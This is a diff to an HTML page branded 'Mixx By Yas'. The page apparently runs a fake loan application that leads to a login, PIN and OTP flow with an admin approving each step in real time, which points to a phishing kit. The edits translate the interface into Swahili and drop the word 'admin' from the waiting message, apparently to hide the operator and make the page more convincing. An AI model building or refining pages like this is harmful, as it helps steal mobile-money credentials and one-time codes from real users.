@@ -286,7 +286,7 @@
 <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
 <div id="page-step1" class="page">
   <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
+    <a class="nav-left" onclick="goTo('page-landing')">← Rudi</a>
     <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">Mixx By Yas</div></div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
@@ -308,7 +308,7 @@
 <!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
 <div id="page-step2" class="page">
   <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
+    <a class="nav-left" onclick="goTo('page-step1')">← Rudi</a>
     <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">Mixx By Yas</div></div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
@@ -340,7 +340,7 @@
 <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
 <div id="page-step3" class="page">
   <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
+    <a class="nav-left" onclick="goTo('page-step2')">← Rudi</a>
     <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">Mixx By Yas</div></div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
@@ -373,7 +373,7 @@
   <div class="sub-wrap">
     <div class="sub-icon">📋</div>
     <h2>Ombi la Mkopo Limewasilishwa</h2>
-    <p>Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to Mixx By Yas.</p>
+    <p>Ombi lako la mkopo limewasilishwa. Tafadhali subiri uthibitisho.<br>Utapokea ujumbe wa kuthibitisha. Kwa sasa, endelea kwenye Mixx By Yas.</p>
     <div class="redir-pill">🔄 Inaelekeza kwenye kuingia kwa Mixx By Yas katika <span class="redir-n" id="rdN">3</span>s...</div><br>
     <button class="btn-go" onclick="goTo('page-login')">Nenda kwenye Kuingia Sasa</button>
   </div>
@@ -447,7 +447,7 @@
       <!-- Waiting for admin approval indicator -->
       <div class="waiting-box" id="pinWait">
         <div class="wb-spinner"></div>
-        <p>Inasubiri admin kuthibitisha maelezo yako…</p>
+        <p>Subiri uthibitisho wa maelezo yako…</p>
       </div>
 
       <div id="otpInputSection">
@@ -916,7 +916,7 @@
     if (!rsBox) return;
 
     // Always rebuild the span fresh so the ID exists
-    rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
+    rsBox.innerHTML = 'Tuma tena msimbo katika sekunde <span id="rsS">' + s + '</span>';
 
     _rsInterval = setInterval(() => {
       s--;
@@ -1059,7 +1059,7 @@
             document.getElementById('otpInputSection').style.display = '';
             // Stop resend timer and reset it
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
+            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo katika sekunde <span id="rsS">60</span>';
             // Clear all OTP messages
             hideOtpMsgs();
             // Reset application state so a fresh login creates a new application
